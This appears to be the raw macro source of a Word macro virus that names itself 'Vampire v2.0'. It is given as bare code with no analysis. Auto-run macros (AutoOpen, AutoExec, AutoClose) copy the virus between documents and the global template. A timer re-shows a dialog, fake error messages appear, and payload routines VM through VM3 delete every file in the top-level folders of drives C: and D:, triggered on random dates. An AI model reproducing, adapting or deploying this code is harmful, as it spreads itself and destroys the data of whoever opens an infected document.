   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Rem Finish date:1997.07.04(Vampire2.0)
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
   Dim W
   WordBasic.DisableInput 1
   On Error Resume Next
   W = WordBasic.Int(Rnd() * 7) + 1
   If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.Weekday(WordBasic.Now()) = W Then
   WordBasic.Call "Pire.VM1"
   End If

   WordBasic.Beep
   WordBasic.MsgBox "?????", "WordBasic Err = 7", 48

   End Sub

   Attribute VB_Name = "ZlockMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "?? ZLOCK ????---ZlockMacro     "
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ZlockMacro.MAIN"
       'Check
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Rem Finish date:1997.07.04(Vampire2.0)
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   Dim W
   WordBasic.DisableInput 1
   On Error Resume Next
   W = WordBasic.Int(Rnd() * 7) + 1
   If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.Weekday(WordBasic.Now()) = W Then
   WordBasic.Call "Pire.VM1"
   End If

   WordBasic.Beep
   WordBasic.MsgBox "?????", "WordBasic Err = 7", 48

   End Sub

   Attribute VB_Name = "AutoClose"

   Rem Finish date:1997.07.04(Vampire2.0)
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim AVA
   Dim W
   On Error Resume Next

   WordBasic.ToolsMacro Name:="AAA", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="BBB", Delete:=1, Show:=1

   AVA = WordBasic.Int(Rnd() * 10) + 1
   If AVA >= 8 Then
   WordBasic.Call "pire.VM"
   WordBasic.Call "Pire.VM2"
   End If

   W = WordBasic.Int(Rnd() * 7) + 1
   If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 And WordBasic.Weekday(WordBasic.Now()) = W Then
   WordBasic.Call "pire.VM1"
   WordBasic.Call "Pire.VM3"
   End If


   exit_:

   End Sub

   Attribute VB_Name = "Vampire2"

   Rem Finish date:1997.07.04(Vampire2.0)
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Vampire2.MAIN"
   Dim push1
   Dim T1$
   Dim T2$
   Dim T2_
   On Error Resume Next
   WordBasic.Beep
   WordBasic.BeginDialog 180, 78, "Macro Virus Vampire2.0"
       WordBasic.Text 9, 9, 160, 13, "??????????", "Text1"
       WordBasic.Text 27, 28, 122, 13, "???????!!", "Text2"
       WordBasic.PushButton 43, 48, 88, 21, "??", "push1"
   WordBasic.EndDialog
   Dim Vampire As Object: Set Vampire = WordBasic.CurValues.UserDialog
   push1 = WordBasic.Dialog.UserDialog(Vampire, -1, 2500)
   T1$ = WordBasic.[Left$](WordBasic.[CTime$](7), 2)
   T2$ = WordBasic.[Right$](WordBasic.[CTime$](7), 2)
   T2_ = WordBasic.Val(T2$)
   T2_ = T2_ + 1
   T2$ = Str(T2_)
   WordBasic.OnTime T1$ + ":" + T2$, "Vampire2"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Rem Finish date:1997.07.04 (Vampire2.0)
   Dim DT$, FNI$
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim V3
   Dim i
   Dim CHC
   DT$ = ""
   FNI$ = ""
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo dlg
   DT$ = dlg.Template
   FNI$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

   SetAttr DT$, 0
   On Error Resume Next
   V3 = WordBasic.CountMacros(0)
   If V3 > 0 Then
     For i = 1 To V3
        If WordBasic.[MacroName$](i, 0) = "AAA" Then CHC = 1
     Next i
   End If
   If CHC <> 1 Then
   WordBasic.Call "AutoExec"
   End If

   WordBasic.Call "Pire"

   End Sub

   Attribute VB_Name = "AutoExec"

   Dim DT$, FNI$
   Rem Finish date:1997.07.04 (Vampire2.0)
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
   Dim V0
   Dim i
   Dim CH
   Dim W
   DT$ = ""
   FNI$ = ""
   On Error Resume Next
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo dlg
   DT$ = dlg.Template
   FNI$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)


   V0 = WordBasic.CountMacros(0)
   If V0 > 0 Then
     For i = 1 To V0
        If WordBasic.[MacroName$](i, 0) = "AAA" Then CH = 1
     Next i
   End If
   If CH <> 1 Then
   CK
   CK1
   End If

   W = WordBasic.Int(Rnd() * 7) + 1
   If WordBasic.Day(WordBasic.Now()) = 1 Or WordBasic.Day(WordBasic.Now()) = 11 Or WordBasic.Day(WordBasic.Now()) = 21 Or WordBasic.Day(WordBasic.Now()) = 31 Or WordBasic.Weekday(WordBasic.Now()) = W Then
   WordBasic.Call "Vampire2"
   End If


   exit_:

   End Sub

   Private Sub CK()


   WordBasic.ToolsMacro Name:="AAA", Edit:=1, Show:=1
   WordBasic.Insert "FileSaveAs .Format =  1"
   WordBasic.InsertPara
   WordBasic.Insert "on error resume next"
   WordBasic.InsertPara
   WordBasic.Insert "Dim dlg As FileSummaryInfo"
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "DT$ = dlg.Template"
   WordBasic.InsertPara
   WordBasic.Insert "FNI$ = FileNameInfo$(FileName$(),    1)"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy , .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "Pire" + Chr(34) + ", .Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "AutoOpen" + Chr(34) + ", .Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "Vampire2" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "AutoExec" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "AutoClose" + Chr(34) + ", .Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "ToolsMacro" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "FileTemplates" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= DT$, .Destination= FNI$, .Name =" + Chr(34) + "ZlockMacro" + Chr(34) + ",.Tab = 3"

   WordBasic.DocClose 1

   exit_:

   End Sub

   Private Sub CK1()

   WordBasic.ToolsMacro Name:="BBB", Edit:=1, Show:=1
   WordBasic.Insert "on error resume next"
   WordBasic.InsertPara
   WordBasic.Insert "Dim dlg As FileSummaryInfo"
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "DT$ = dlg.Template"
   WordBasic.InsertPara
   WordBasic.Insert "FNI$ = FileNameInfo$(FileName$(),    1)"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy , .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "Pire" + Chr(34) + ", .Tab =3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "AutoOpen" + Chr(34) + ", .Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "Vampire2" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "AutoExec" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "AutoClose" + Chr(34) + ", .Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "ToolsMacro" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "FileTemplates" + Chr(34) + ",.Tab = 3"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= FNI$, .Destination= DT$, .Name =" + Chr(34) + "ZlockMacro" + Chr(34) + ",.Tab = 3"

   WordBasic.DocClose 1


   exit_:

   End Sub

   Attribute VB_Name = "Pire"

   Dim DT$, FNI$
   Rem Finish date:1997.07.04 (Vampire2.0)
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Pire.MAIN"
   Dim V1
   Dim i
   Dim CCH
   Dim V2
   Dim j
   Dim CHH
   DT$ = ""
   FNI$ = ""
   On Error Resume Next
   V1 = WordBasic.CountMacros(0)
   If V1 > 0 Then
     For i = 1 To V1
        If WordBasic.[MacroName$](i, 0) = "Pire" Then CCH = 1
     Next i
   End If
   If CCH <> 1 Then
   WordBasic.Call "BBB"
   End If

   V2 = WordBasic.CountMacros(1)
   If V2 > 0 Then
      For j = 1 To V2
          If WordBasic.[MacroName$](j, 1) = "Pire" Then CHH = 1
      Next j
   End If
   If CHH <> 1 Then
   WordBasic.Call "AAA"
   End If

   exit_:

   End Sub

   Private Sub VM()
   Dim CD
   Dim L
   Dim la$
   Dim lam$

   On Error Resume Next

   lamo:
   On Error Resume Next
   CD = WordBasic.CountDirectories("C:\")
   For L = 1 To CD
   la$ = "C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$

   NE:
   Next L

   exit_:

   End Sub


   Private Sub VM1()
   Dim R
   Dim CD1
   Dim L
   Dim la$
   Dim lam$
   R = 0
   On Error Resume Next

   lamoa:
   CD1 = WordBasic.CountDirectories("C:\")
   For L = 1 To CD1
   la$ = "C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$

   NE:
   Next L

   exit_:

   R = R + 1
   If R <= 7 Then GoTo lamoa

   End Sub

   Private Sub VM2()
   Dim CD2
   Dim L
   Dim la$
   Dim lam$
   On Error Resume Next
   lamob:
   On Error Resume Next
   CD2 = WordBasic.CountDirectories("D:\")
   For L = 1 To CD2
   la$ = "D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$


   NE:
   Next L

   exit_:

   End Sub

   Private Sub VM3()
   Dim R
   Dim CD3
   Dim L
   Dim la$
   Dim lam$
   R = 0
   On Error Resume Next

   lamoc:
   CD3 = WordBasic.CountDirectories("D:\")
   For L = 1 To CD3
   la$ = "D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$

   NE:
   Next L

   exit_:

   R = R + 1
   If R <= 7 Then GoTo lamoc

   End Sub
